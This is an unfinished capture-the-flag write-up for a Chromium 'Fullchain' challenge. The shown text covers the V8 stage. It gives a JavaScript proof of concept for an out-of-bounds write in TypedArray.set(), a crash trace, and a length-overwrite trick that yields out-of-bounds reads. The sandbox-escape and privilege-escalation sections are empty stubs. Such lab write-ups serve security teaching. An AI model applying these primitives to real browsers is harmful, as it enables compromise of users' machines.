# Fullchain

Chromium is built from commit `1be58e78c7ec6603d416aed4dfae757334cd4e1e`. Linux is v5.12.9, you can download the sources from [here](https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.12.9.tar.xz). The VM is built from Debian.

## Setup

This challenge runs in a QEMU vm. Use `run_qemu.py` to run it.

## Challenge files

The original challenge provided comes with QEMU emulator artifacts (Linux kernel, init script, rootfs), a custom kernel module, patch files, and python run scripts.

```bash
-rw-r--r-- 1 user user    9624672 Dec 31  1979 bzImage
drwxrwxr-x 4 user user       4096 Oct 23 12:19 chromium
-rw-r--r-- 1 user user       3587 Dec 31  1979 ctf.c
-rw-r--r-- 1 user user       8160 Dec 31  1979 ctf.ko
-rw-r--r-- 1 user user         14 Dec 31  1979 flag
-rw-r--r-- 1 user user       1255 Dec 31  1979 init
-rw-r--r-- 1 user user        316 Dec 31  1979 README.md
-rw-r--r-- 1 user user 3221225472 Dec 31  1979 rootfs.img
-rw-r--r-- 1 user user        985 Dec 31  1979 run_chromium.py
-rw-r--r-- 1 user user       1619 Dec 31  1979 run_qemu.py
-rw-r--r-- 1 user user       9363 Dec 31  1979 sbx_bug.patch
-rw-r--r-- 1 user user       1158 Dec 31  1979 v8_bug.patch
```

The zip file can be obtained from [here](https://storage.googleapis.com/gctf-2021-attachments-project/c12856fc6c010d643763e678265f7921b7a44dcd7bcb5ced32634d21dfdff0c5f9542d6a5bdcc6639d8834ab1ff25b263affd8952b11e972c2066aa3cae71540)

```bash
$ # Original Filename: c12856fc6c010d643763e678265f7921b7a44dcd7bcb5ced32634d21dfdff0c5f9542d6a5bdcc6639d8834ab1ff25b263affd8952b11e972c2066aa3cae71540

$ ls -l fullchain-zip
-rw-rw-rw- 1 user user  894725817 Oct 23 12:18 fullchain-zip

$ sha256sum fullchain-zip 
b8f0dc28ed5faaa0fa3886add2f1bcdeb9089916e8db226cbddef4b44c64faf5

$ md5sum fullchain-zip 
71a4abab7e587c1f58b530940b14bcfd  fullchain-zip
```

## Prerequisite Reading



## Summary of exploit

First, we can break down the tasks we are going to accomplish into three main exploits, they are:

1. Browser exploit
2. Sandbox escape
3. Privilege escalation

**Browser exploit**

The browser exploit will use the vulnerability introduced by [v8_bug.patch](v8_bug.patch). Due to the sandbox, our level of access after exploiting the browser process requires a sandbox escape. 

A vulnerability has been introduced by [sbx_bug.patch](sbx_bug.patch) to permit this possibility by exploiting Mojo, the interprocess-communication (IPC) mechanism. However, mojo is not exposed to javascript by default so we must enable it first.

In summary, the goal of the browser exploit is to:
1. Enable mojo
2. Reload the webpage -> start sandbox escape

First, we analyze the bug introduced into v8. The bug is in a `Torque` function, which is the native-code that represents the behavior of built-in javascript functions.

A small change has been made to the `TypedArrayPrototypeSetTypedArray` function which will impact different `Array` javascript objects.

The call to `CheckIntegerIndexAdditionOverflow` has been removed. Without this bounds-checking function, this means that calling the [set()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray/set) method on the array can cause a buffer overflow.

In other words, we will write javascript code to trigger this native-code behavior.

A short javascript proof-of-concept code is below:
```javascript
let x = new Uint32Array(8);
let y = new Uint32Array(8);
x.set(y, 4);
console.log(x);
```

We will save the javascript code above as `poc.js`.

To test `poc.js` in chrome, make sure to source the javascript from an html file like so:
```html
<!DOCTYPE html>
<html>
    <head>
        <title>renderer</title>
    </head>
    <body>
        <script src="poc.js"></script>
    </body>
</html>
```

We will call this file `poc.html`.

Ensure the html and js files are in the same directory, then run the code in chrome with the following shell command:
```bash
$ ./chrome --headless --disable-gpu --enable-logging=stderr --user-data-dir=/tmp/userdata ./poc.html
```

You should see a stacktrace for the segmentation fault as below:
```
Received signal 11 SEGV_ACCERR 2d7a512217ff
#0 0x56287fdac5c9 base::debug::CollectStackTrace()
#1 0x56287fd17763 base::debug::StackTrace::StackTrace()
#2 0x56287fdac0f1 base::debug::(anonymous namespace)::StackDumpSignalHandler()
#3 0x7fba8bd593c0 (/usr/lib/x86_64-linux-gnu/libpthread-2.31.so+0x153bf)
#4 0x56287f484860 Builtins_ObjectToString
  r8: 0000000000000000  r9: 00002d7a08048735 r10: 00002b4a002a4fc9 r11: 0000000000000001
 r12: 00002b4a00508000 r13: 00002b4a00508000 r14: 00002d7a00000000 r15: 00002d7a08204b09
  di: 00000000000080de  si: 00002d7a08203e99  bp: 00007ffe8b8b35a0  bx: 0000000000000000
  dx: 00002d7a08004b71  ax: 00002d7a08048735  cx: 00002d7a51221800  sp: 00007ffe8b8b3578
  ip: 000056287f484860 efl: 0000000000010287 cgf: 002b000000000033 erf: 0000000000000004
 trp: 000000000000000e msk: 0000000000000000 cr2: 00002d7a512217ff
[end of stack trace]
[1024/092801.729053:ERROR:headless_shell.cc(423)] Abnormal renderer termination.
```

TODO: Check this in d8

An incomplete, simplistic view of memory and the corresponding javascript can be viewed below:
```javascript
let x = new Uint32Array(8);
// x = [ x0 | x1 | x2 | x3 | x4 | x5 | x6 | x7 ]

let y = new Uint32Array(8);
// y = [ y0 | y1 | y2 | y3 | y4 | y5 | y6 | y7 ]

x.set(y, 4);
// copy array y into array x starting at array x index 4
//                copy start -v
// x = [ x0 | x1 | x2 | x3 | y0 | y1 | y2 | y3 ] y4 | y5 | y6 | y7
//                            buffer overflow! --^

console.log(x);
// crash on access
```

Using the `set()` method, the bug provides us an out-of-bounds write exploit primitive since we can control the index into the array as well as the size of the array being copied (effectively specific offsets of adjacent memory).

**addrof primitive**

One of the core building-blocks of a browser exploit is to create the `addrof` primitive. Essentially, `addrof` is a native memory address leak of an arbitrary javascript object.

We can begin by converting the out-of-bounds write into an out-of-bounds read.

We can achieve out-of-bounds read by using the out-of-bounds write to overwrite the length field of an array object. Then, when we read the array object, we read more memory than the object originally intended.

An simplistic view of memory and the corresponding javascript can be viewed below:
```javascript
let y = new Uint32Array(1);
// y = [ y0 ]

let x = new Uint32Array(1);
// x = [ x0 ]

let z = [1.1, 1.1, 1.1, 1.1];
// z = [ 1.1 | 1.1 | 1.1 | 1.1 ]

y.set([2222], 0);
// y = [ 2222 ]

x.set(y, 33);
// offset 33 out-of-bounds -v
// x = [ x0 ] ... ... ... [ 2222 ] ... [ 1.1 | 1.1 | 1.1 | 1.1 ]
// array z's length metadata -^ 

console.log(z.length);
// verify that array z's length field has been overwritten to 1111
```

Running this proof-of-concept code results in the log output:
```
[1024/111758.744535:INFO:CONSOLE(6)] "1111", source: file:///home/user/Public/chromium/poc.js (6)
```

v8 represents integer values in memory with small-integer (SMI) which is why `1111` appears instead of `2222`.

**arbitrary address primitives**

Our current exploit primitives are:
* out-of-bounds write
* out-of-bounds read 
* addrof

The next building block is to achieve an arbitrary-address-read (AAR) and arbitrary-address-write (AAW). The AAR and AAW exploit primitives will provide the ability for us to read and write values from a pointer we specify.

**Sandbox escape**

The sandbox escape will use the vulnerability introduced by [sbx_bug.patch](sbx_bug.patch) which adds a new interface feature to mojo named `CtfInterface`.

**Privilege escalation**


#### References

[original writeup by yudai](https://ptr-yudai.hatenablog.com/entry/2021/07/26/225308)
